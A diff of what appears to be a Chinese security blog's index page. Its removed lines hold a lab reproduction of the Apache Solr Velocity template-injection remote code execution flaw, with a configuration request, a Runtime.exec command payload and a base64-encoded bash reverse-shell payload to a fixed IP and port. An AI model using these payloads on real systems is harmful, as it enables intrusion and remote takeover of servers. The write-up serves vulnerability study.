@@ -382,30 +382,14 @@
 
       
         
-          
-            <h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Apache Solr是美国阿帕奇（Apache）软件基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。Apache Velocity是一个提供HTML页面模板、email模板和通用开源代码生成器模板的模板引擎。在Apache Solr 的多个版本中，Apache Solr的VelocityResponseWriter功能的配置参数可通过HTTP请求指定，导致用户可通过设置特定参数后，通过注入任意Velocity模板造成任意命令执行。</p>
-<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><p>version &gt; 5的版本都受影响。经测试6.2.1，7.3.1，7.4.0，以及最新版8.2.0均存在此漏洞。其他版本暂未测试.</p>
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>想要利用此漏洞，其中solrconfig.xml配置文件至少需要以下内容</p>
-<p><img src="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/6.png" alt></p>
-<p>在满足以上环境条件的情况下，利用此漏洞分两步骤。先通过一个HTTP请求将params.resource.loader.enabled这个关键的参数设置true，这样就能允许任意的模板代码从用户的HTTP请求中指定。然后再通过指定任意Velocity模板代码执行任意命令。由于Solr默认未开启认证，在这种情况下，此漏洞利用不需要登录凭据。<br>这里使用vulhub,在其中创建一个合集后直接复现</p>
-<h6 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/1.png" alt></p>
-<h6 id="创建一个合集"><a href="#创建一个合集" class="headerlink" title="创建一个合集"></a>创建一个合集</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/2.png" alt></p>
-<p>开启params.resource.loader.enabled</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/创建的集合/config HTTP/1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/3.png" alt></p>
-<h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class="line">Host: localhost:8983</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/4.png" alt></p>
-<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.99.75:8983/solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash+-c+%7becho%2cYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xNzMvNzc3NyAwPiYx%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/5.png" alt></p>
-
-          
+          <h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Apache Solr是美国阿帕奇（Apache）软件基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。Apache Velocity是一个提供HTML页面模板、email模板和通用开源代码生成器模板的模板引擎。在Apache Solr 的多个版本中，Apache Solr的VelocityResponseWriter功能的配置参数可通过HTTP请求指定，导致用户可通过设置特定参数后，通过注入任意Velocity模板造成任意命令执行。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
